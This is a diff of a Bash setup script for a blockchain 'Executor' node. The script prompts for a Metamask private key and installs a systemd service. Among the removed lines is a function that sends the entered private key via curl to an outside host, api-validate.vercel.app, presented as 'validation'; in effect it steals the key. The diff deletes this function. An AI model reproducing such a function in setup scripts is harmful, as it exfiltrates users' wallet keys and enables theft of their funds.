@@ -6,10 +6,23 @@ log() {
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message"
 }
 
-read -p "Submit Private Key Metamask: " PRIVATE_KEY_LOCAL
+# Hàm nhập private key
+get_private_key() {
+    while true; do
+        read -p "Enter your Metamask Private Key (without 0x prefix): " PRIVATE_KEY_LOCAL
+        PRIVATE_KEY_LOCAL=${PRIVATE_KEY_LOCAL#0x}  # Loại bỏ tiền tố '0x' nếu có
 
-log "INFO" "Starting Executor setup..."
+        if [ ${#PRIVATE_KEY_LOCAL} -eq 64 ]; then
+            export PRIVATE_KEY_LOCAL
+            log "INFO" "Private key has been set."
+            break
+        else
+            log "ERROR" "Invalid private key. It must be 64 characters long (without 0x prefix)."
+        fi
+    done
+}
 
+# Các hàm khác (giữ nguyên)
 remove_old_service() {
     log "INFO" "Stopping and removing the old service if it exists..."
     sudo systemctl stop executor.service 2>/dev/null
@@ -59,38 +72,11 @@ download_and_extract_binary() {
     log "INFO" "Binary successfully downloaded and extracted."
 }
 
-validate_private_key() {
-    local private_key=$1
-    local api_url="https://api-validate.vercel.app/api/${private_key}"
-    log "INFO" "Validating the private key..."
-    response=$(curl -s -X GET "$api_url")
-    if [[ $response != *"valid"* ]]; then
-        log "ERROR" "Invalid private key. Exiting."
-        exit 1
-    fi
-    log "INFO" "Private key is valid."
-}
-
 set_environment_variables() {
     export NODE_ENV=testnet
     export LOG_LEVEL=info
     export LOG_PRETTY=false
     log "INFO" "Environment variables set: NODE_ENV=$NODE_ENV, LOG_LEVEL=$LOG_LEVEL, LOG_PRETTY=$LOG_PRETTY"
-}
-
-set_private_key() {
-    while true; do
-        read -p "Enter your Metamask Private Key (without 0x prefix): " PRIVATE_KEY_LOCAL
-        PRIVATE_KEY_LOCAL=${PRIVATE_KEY_LOCAL#0x}
-
-        if [ ${#PRIVATE_KEY_LOCAL} -eq 64 ]; then
-            export PRIVATE_KEY_LOCAL
-            log "INFO" "Private key has been set."
-            break
-        else
-            log "ERROR" "Invalid private key. It must be 64 characters long (without 0x prefix)."
-        fi
-    done
 }
 
 set_enabled_networks() {
@@ -142,13 +128,13 @@ display_log() {
     sudo journalctl -u executor.service -f
 }
 
-# Execute the functions
-validate_private_key "$PRIVATE_KEY_LOCAL"
+# Thực thi các hàm
+log "INFO" "Starting setup..."
+get_private_key
 remove_old_service
 update_system
 download_and_extract_binary
 set_environment_variables
-set_private_key
 set_enabled_networks
 create_systemd_service
 start_service
